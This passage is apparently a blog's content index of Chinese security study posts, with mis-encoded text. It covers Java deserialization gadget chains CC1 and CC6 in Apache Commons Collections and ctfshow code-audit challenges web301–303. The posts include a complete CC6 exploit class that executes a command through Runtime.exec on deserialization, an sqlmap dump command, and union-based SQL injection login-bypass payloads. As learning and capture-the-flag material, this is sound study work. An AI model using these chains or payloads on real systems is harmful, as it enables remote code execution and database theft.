alt="image-20230322214845664"></p><p>ç„¶åæˆ‘ä»¬å†æŠŠcc1åé¢çš„ä»£ç æ‹¿è¿‡æ¥</p>]]></content>
      
      
      
        <tags>
            
            <tag> javaååºåˆ—åŒ– cc3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaååºåˆ—åŒ–-cc6</title>
      <link href="/posts/d6e4b178.html"/>
      <url>/posts/d6e4b178.html</url>
      
        <content type="html"><![CDATA[<p>ç”±äºjdk1.8_71ä»¥åå¯¹<code>AnnotationInvocationHandler</code>è¿™ä¸ªç±»è¿›è¡Œäº†å¤„ç†ï¼Œç„¶åå°±å¯¼è‡´äº†cc1é“¾ç”¨ä¸äº†äº†ï¼Œç„¶åå°±è¯ç”Ÿäº†ä¸ªcc6çš„é“¾å­</p><p>å°±æ˜¯ä¿®æ”¹äº†è¿™ä¸ªç±»é‡Œè¾¹çš„readObjectæ–¹æ³•</p><p><img src="../images/image-20230319193748245.png" alt="image-20230319193748245"></p><p>è¿™å°±æ˜¯é“¾å­çš„æ„é€ </p><p>ä¸å—jdkç‰ˆæœ¬çš„å½±å“ï¼Œè¿™é‡Œçš„è¯å°±ç›´æ¥è·Ÿç€å›¾ç‰‡ä¸Šçš„é“¾å­æ¥èµ°äº†</p><p>è¿™é‡Œç®€å•è¯´ä¸€ä¸‹å°±æ˜¯è¿™é‡Œçš„è¯æ˜¯å…ˆHashMapé‡Œé¢çš„readObjectæ–¹æ³•ï¼Œç„¶ååˆ°è°ƒç”¨åˆ°é‡Œé¢çš„hashæ–¹æ³•ï¼Œç„¶åhashæ–¹æ³•å°±ä¼šè°ƒç”¨åˆ°hashcodeæ–¹æ³•ï¼Œç„¶åå°±æ¥ç€ä¸‹é¢å†™çš„å°±è¡Œ</p><p>å°±æ˜¯æ‰¾åˆ°äº†è¿™ä¸ªç±»(TiedMapEntry)</p><p><img src="../images/image-20230319194451418.png" alt="image-20230319194451418"></p><p>ç„¶åæ‰¾åˆ°è¿™ä¸ªç±»é‡Œè¾¹çš„hashcodeæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•é‡Œé¢è°ƒç”¨äº†getValue</p><p><img src="../images/image-20230319194615690.png" alt="image-20230319194615690"></p><p><img src="../images/image-20230319194625684.png" alt="image-20230319194625684"></p><p>ç„¶ågetValueé‡Œé¢å°±ä¼šè°ƒç”¨åˆ°getæ–¹æ³•ï¼Œç„¶åmapå¯æ§ï¼Œå¯ä»¥ä¼ ä¸ºLazymapï¼Œç„¶ååé¢çš„å°±å’Œcc1ä¸€æ ·äº†</p><p><img src="../images/image-20230319195615382.png" alt="image-20230319195615382"></p><p>è¿™é‡Œå°±å…ˆæŠŠä¹‹å‰å†™çš„cc1çš„ä¸œè¥¿ç»™å¤åˆ¶è¿‡æ¥</p><p><img src="../images/image-20230319200144657.png" alt="image-20230319200144657"></p><p>è¿™é‡Œå°±å…ˆè¿›è¡Œè¡¥å……ï¼Œè¿™é‡Œåˆ©ç”¨putç»™hashmapé‡Œé¢èµ‹å€¼(hashmapæ„é€ å‡½æ•°ä¸èƒ½èµ‹å€¼)ï¼Œè¿™é‡Œåœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨hashmapé‡Œçš„readObjectæ–¹æ³•ï¼Œç„¶åè°ƒç”¨é‡Œé¢çš„hashæ–¹æ³•ï¼Œhashæ–¹æ³•é‡Œé¢å°±ä¼šè°ƒç”¨tiedMapEntryçš„hashcodeæ–¹æ³•ï¼Œç„¶åè¿™ä¸ªå°±ä¼šTiedMapEntryé‡Œé¢çš„getValueæ–¹æ³•ï¼Œç„¶ååœ¨è°ƒç”¨lazy.getæ–¹æ³•ï¼Œç„¶åå…¶ä»–çš„å°±å’Œcc1ä¸€æ ·äº†</p><p>ä½†æ˜¯æƒ³æ³•æ€»æ˜¯å¥½çš„ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯æˆ‘ä»¬åœ¨putä¼ å€¼çš„æ—¶å€™ï¼Œä¹Ÿè°ƒç”¨äº†hashæ–¹æ³•ï¼Œå¯¼è‡´åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±å¼¹äº†è®¡ç®—å™¨(å’ŒURLDNSé‚£æ¡é“¾ç±»ä¼¼)</p><p><strong>è§£å†³åŠæ³•</strong></p><p><img src="../images/image-20230319201415245.png" alt="image-20230319201415245"></p><p>æŒ‰ç…§ä»£ç çš„é¡ºåºä¸€è¡Œä¸€è¡Œçœ‹ä¸‹æ¥ï¼Œå°±æ˜¯åœ¨putä¼ å‚çš„æ—¶å€™æŠŠlazymapé‡Œé¢çš„å€¼ç»™ä¿®æ”¹æ‰ï¼Œæ”¹æˆä¸€ä¸ªæ²¡å•¥ç”¨çš„å€¼ï¼Œç„¶åè®©ä»–ä¸èƒ½æ‰§è¡Œï¼Œ(ç®€å•ç‚¹è¯´å°±æ˜¯æŠŠé“¾å­ç ´å)ï¼Œç„¶åä¸‹é¢å†ç”¨åå°„ç»™ä¿®æ”¹å›æ¥</p><p>ä½†æ˜¯è¿™é‡Œè¿˜ä¸è¡Œï¼Œè¿™é‡Œè¿˜æ˜¯å’ŒURLDNSé‚£æ¡é“¾ä¸€ä¸ªæ ·å­ï¼Œå°±æ˜¯ä¼šæ–°å»ºä¸€ä¸ªkeyçš„å€¼ï¼Œå¯¼è‡´åé¢ååºåˆ—åŒ–çš„æ—¶å€™è¿›ä¸æ¥è¿™ä¸ªifï¼Œç„¶åå¯¼è‡´è°ƒç”¨ä¸åˆ°è¿™ä¸ªput</p><p>è¿™ä¸ªkeyæ˜¯Lazymapç±»é‡Œè¾¹çš„</p><p><img src="../images/image-20230319202113261.png" alt="image-20230319202113261"></p><p><strong>è§£å†³åŠæ³•</strong></p><p>å°±æ˜¯æŠŠè¿™ä¸ªkeyç»™åˆ äº†</p><p><img src="../images/image-20230319202354112.png" alt="image-20230319202354112"></p><p><strong>cc6.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.policy.privateutil.PolicyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span> &#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">                &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(tiedMapEntry,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(lazyMap,chainedTransformer);</span><br><span class="line">        <span class="comment">//serialize(hashMap1);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯è¦æŠŠdebugæ—¶å€™çš„è‡ªåŠ¨è°ƒç”¨tostringæ–¹æ³•ç»™å…³æ‰ï¼Œä¸ç„¶å¯èƒ½ä¼šä¸æˆåŠŸ</p><p><strong>è¿™é‡Œè¯æ˜¯ä¸é™åˆ¶jdkç‰ˆæœ¬çš„ï¼Œåªå¯¹ccé“¾çš„ç‰ˆæœ¬è¿›è¡Œé™åˆ¶</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> javaååºåˆ—åŒ– cc6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-ä»£ç å®¡è®¡</title>
      <link href="/posts/29301d9.html"/>
      <url>/posts/29301d9.html</url>
      
        <content type="html"><![CDATA[<h2 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h2><p>é¢˜ç›®(ç»™äº†æºç )</p><p><strong>checklogin.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line"><span class="variable">$userpwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select sds_password from sds_user where sds_username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; order by id limit 1;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows&lt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$userpwd</span>,<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>; </span><br><span class="line"><span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line"><span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>fun.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»™çš„ä»£ç é‡Œä¸»è¦çš„å°±æ˜¯è¿™ä¸¤ä¸ªä»£ç äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¯¹è¿™ä¸ªä»£ç è¿›è¡Œå®¡è®¡ä¸€ä¸‹</p><p>æˆ‘ä»¬è¿›è¡Œå®¡è®¡å‘ç°è¿™ä¸ªä»£ç sqlæ˜¯æ²¡æœ‰wafçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•å»è¿›è¡Œä¸€ä¸‹<strong>sqlmap</strong>å·¥å…·çš„åˆ©ç”¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>f06618b6<span class="number">-6697</span><span class="number">-4</span>bc5<span class="operator">-</span>a506<span class="number">-50</span>b8e9ce7739.challenge.ctf.show<span class="operator">/</span>checklogin.php <span class="comment">--form --batch --dump</span></span><br></pre></td></tr></table></figure><p>yuå¸ˆå‚…ä½¿ç”¨çš„è¿™ä¸ªå·¥å…·å°±ä¼šå…¨éƒ¨å¯¼å‡ºæ•°æ®åº“  è¡¨  åˆ—  å’Œåˆ—é‡Œé¢çš„ä¸œè¥¿</p><p><img src="../images/image-20230318221422214.png" alt="image-20230318221422214"></p><p>æœ€åå°±ä¼šæ‹¿åˆ°è´¦å·å¯†ç äº†</p><p><img src="../images/image-20230318221525179.png" alt="image-20230318221525179"></p><p>æ‹¿åˆ°flagäº†</p><p>è¿™é‡Œçš„è¯ä»£ç ä¸­åˆæœ‰ä¸€ä¸ªé€»è¾‘æ¼æ´</p><p><img src="../images/image-20230318221733657.png" alt="image-20230318221733657"></p><p>è¿™é‡Œå°±æ˜¯åªè¦æˆ‘ä»¬è¾“å…¥çš„å¯†ç å’Œæ•°æ®åº“ä¸­çš„å¯†ç ç›¸ç­‰å°±è¡Œäº†</p><p>ä»–è¿™é‡Œæ˜¯åˆ©ç”¨sqlè¯­å¥æ¥æŸ¥æ‰¾æ•°æ®åº“ä¸­çš„å¯†ç ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œæ§åˆ¶æ•°æ®åº“ä¸­çš„å¯†ç </p><p><img src="../images/image-20230318223043391.png" alt="image-20230318223043391"></p><p>å½“å‰é¢æŸ¥è¯¢ä¸å­˜åœ¨æ—¶ï¼Œå°±ä¼šä½¿ç”¨åé¢å®šä¹‰çš„å€¼</p><p><strong>paylaod</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1#</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h2 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h2><p>é¢˜ç›®</p><p>ç»™äº†ç»™é¢˜ç›®è¯´æ˜</p><p><strong>ä¿®æ”¹çš„åœ°æ–¹</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="title function_ invoke__">sds_decode</span>(<span class="variable">$userpwd</span>),<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¿®æ”¹äº†è¿™ï¼Œé‚£ä¹ˆå°±ä¼šå¯¹æˆ‘ä»¬ä¼ è¿›æ¥çš„userpwdè¿›è¡ŒåŠ å¯†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬ä¼ è¿›æ¥çš„stræ˜¯1ï¼Œæ‰€ä»¥å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªå†™å¥½çš„phpä»£ç æ¥è¿›è¡Œç”ŸæˆåŠ å¯†åçš„å€¼</p><p><img src="../images/image-20230318225948652.png" alt="image-20230318225948652"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select &quot;d9c77c4e454869d5d8da3b4be79694d3&quot;#</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨é‡æ–°ä¿®æ”¹ä¸€ä¸‹sqlè¯­å¥</p><p>ç„¶åè¿™é“é¢˜å°±å®Œæˆï¼Œè¿™åªæ˜¯ç®€å•çš„å¯¹ç”¨æˆ·ä¼ è¿›æ¥çš„å¯†ç è¿›è¡ŒåŠ å¯†è€Œå·²ï¼Œç„¶ååˆç»™äº†åŠ å¯†ä»£ç ï¼Œæ‰€ä»¥è¿™æ ·å°±èƒ½é€šè¿‡ç»™çš„åŠ å¯†ä»£ç åˆ¤æ–­å‡ºåŠ å¯†çš„å€¼äº†</p><h2 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h2><p>é¢˜ç›®</p><p>è¿™æ¬¡æ¢æºç äº†</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaååºåˆ—åŒ–-cc1</title>
      <link href="/posts/488024db.html"/>
      <url>/posts/488024db.html</url>
      
        <content type="html"><![CDATA[<p>æˆ‘æ˜¯çœ‹è¿™ä¸ªè§†é¢‘æ¥è¿›è¡Œå­¦ä¹ çš„ <a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">cc1</a></p><p>è¿™é‡Œçš„è¯ä¸è¦è·³è¿‡è§†é¢‘é‡Œçš„é‚£ä¸ªå®‰è£…è°ƒè¯•åŒ…çš„ä»£ç ï¼Œè·³è¿‡çš„è¯å°±ä¼šå¤ç°ä¸äº†ï¼Œå¾—ä¸€æ­¥ä¸€æ­¥è·Ÿç€åš</p><p>è¿™ä¸ªcc1é“¾çš„å±é™©æ–¹æ³•å°±æ˜¯å‘ç°äº†Transformeræ¥å£</p><p><img src="../images/image-20230316222922808.png" alt="image-20230316222922808"></p><p>ç„¶ååˆ©ç”¨é‡Œé¢çš„è¿™ä¸ªtransformå‡½æ•°</p><p><img src="../images/image-20230316223143480.png" alt="image-20230316223143480"></p><p>è¿™é‡Œè¯å°±æ˜¯æœ¬ç¯‡æ–‡ç« ä¸»è¦è®²çš„åœ°æ–¹ï¼Œå°±æ˜¯åˆ©ç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ¥è¿›è¡Œæ“ä½œ</p><p>è¿™é‡Œé¢è¿˜å†™ä¸€ä¸ªåå°„è°ƒç”¨ï¼Œå¹¶ä¸”é‡Œé¢çš„å€¼è¿˜å¯æ§ï¼Œè¿™å°±æ˜¯é€ æˆä»»æ„æ–¹æ³•è°ƒç”¨äº†ï¼Œæ‰€ä»¥è¿™å°±æ˜¯è¿™ä¸ªé“¾å­çš„å…¥å£</p><p>è¿™é‡Œçš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥å¼¹ä¸ªè®¡ç®—å™¨</p><p><img src="../images/image-20230316225007753.png" alt="image-20230316225007753"></p><p>è¿™é‡Œæ˜¯<code>InvokerTransformer</code>çš„æ„é€ å‡½æ•°æ–¹æ³•ï¼Œç»“åˆä¸Šé¢çš„å›¾ç‰‡ï¼Œå¯çŸ¥é€šè¿‡è¿™ä¸ªæ„é€ å‡½æ•°ä¼ å‚ä»è€Œå¼¹ä¸ªè®¡ç®—å™¨</p><p><img src="../images/image-20230317164525497.png" alt="image-20230317164525497"></p><p>è¿™å°±æˆåŠŸå¼¹å‡ºäº†ä¸€ä¸ªè®¡ç®—å™¨</p><p><strong>å‘ç°è¿™é‡Œå¯ä»¥ä»»æ„å‡½æ•°è°ƒç”¨åï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—å»æ‰¾è°çš„é‡Œé¢è°ƒç”¨transformer</strong></p><p><img src="../images/image-20230317165005890.png" alt="image-20230317165005890"></p><p>æŸ¥æ‰¾åå‘ç°æœ‰21ä¸ªè°ƒç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—ä»é‡Œé¢æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„æ–¹æ³•</p><p>(å¾—æ‰¾ä¸€ä¸ªä¸åŒåçš„å‡½æ•°é‡Œé¢æ—¶è°ƒç”¨transformerçš„)</p><p>ç„¶åæˆ‘ä»¬å°±æ‰¾åˆ°äº†è¿™ä¸ªæ–¹æ³•æ˜¯è°ƒç”¨transformerçš„(æ˜¯åœ¨TransformedMapç±»é‡Œè¾¹çš„)</p><p><img src="../images/image-20230317170511870.png" alt="image-20230317170511870"></p><p><img src="../images/image-20230317165356791.png" alt="image-20230317165356791"></p><p>ç„¶åæˆ‘ä»¬å°±è·Ÿè¿›çœ‹ä¸€ä¸‹<code>valueTransformer</code>æ˜¯ä»€ä¹ˆä¸œè¥¿</p><p><img src="../images/image-20230317165605279.png" alt="image-20230317165605279"></p><p>æ˜¯æœ‰ä¸€ä¸ªä¿æŠ¤çš„å‡½æ•°æ–¹æ³•æ¥ç»™ä»–èµ‹å€¼ï¼Œé‚£æˆ‘ä»¬ç»§ç»­è·Ÿè¿›ï¼Œçœ‹ä¸€ä¸‹å’‹è°ƒç”¨è¿™ä¸ªå‡½æ•°æ–¹æ³•</p><p>ç„¶åå°±å‘ç°è¿™é‡Œæœ‰ä¸ªdecorateæ–¹æ³•è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°æ–¹æ³•ï¼Œå¹¶ä¸”è¿˜å¯ä»¥ä¼ å€¼</p><p><img src="../images/image-20230317165703877.png" alt="image-20230317165703877"></p><p>å› ä¸ºè¿™ä¸ªdecorateé‡Œè¾¹éœ€è¦ä¼ ä¸€ä¸ªmapç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æ–°å»ºä¸€ä¸ªmapç±»æ¥ä¼ å‚ã€‚</p><p><img src="../images/image-20230317170703239.png" alt="image-20230317170703239"></p><p>è¿™é‡Œåªè¦å†™æ˜¯å› 